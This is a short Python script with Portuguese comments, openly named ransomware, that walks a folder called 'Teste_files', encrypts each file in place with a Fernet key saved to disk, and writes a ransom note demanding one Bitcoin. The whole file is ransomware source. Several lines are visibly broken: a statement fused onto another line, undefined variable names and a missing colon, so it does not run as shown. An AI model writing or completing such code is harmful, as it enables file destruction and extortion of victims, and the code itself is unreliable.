from cryptography.fernet import Fernet
import os


#1. Gerar uma chave de criptografia esalva      

def generate_chave():
    chave = Fernet.generate_key() with open("chave.key", "wb") as chave_arquivo:    
        chave_arquivo.write(chave)

#2. Carregar a chave de criptografia salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar arquivos em um diretório específico
def criptografar_arquivos(diretorio, chave):    
    f = Fernet(chave)    
    with open(arquivo, "rb") as file:        
        dados = file.read()
    dados_criptografados = f.encrypt(dados)    
    with open(arquivo, "wb") as file:        
        file.write(dados_criptografados)

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):    
    lista = []    
    for raiz, subpastas, arquivos in os.walk(diretorio):        
        for nome in arquivos:     
            caminho = os.path.join(pasta_raiz, arquivo)   
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Criar Mensagem de resgate
def criar_mensagem_resgate():
    with open("MENSAGEM_DE_RESGATE.txt", "w") as f
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperá-los, envie 1 Bitcoin para o endereço abaixo:\n")
        f.write("[ENDEREÇO DE BITCOIN]\n")  
        f.write("Após o pagamento, envie um e-mail para [SEU EMAIL] com o comprovante.\n")

#6. Executar o ransomware
def main():  
    generate_chave()    
    chave = carregar_chave()    
    arquivos = encontrar_arquivos("Teste_files")
    for arquivo in arquivos:        
        criptografar_arquivos(arquivo, chave)    
    criar_mensagem_resgate()
    print("Seus arquivos foram criptografados! Leia MENSAGEM_DE_RESGATE.txt para mais informações.")

if __name__ == "__main__":    
    main()   
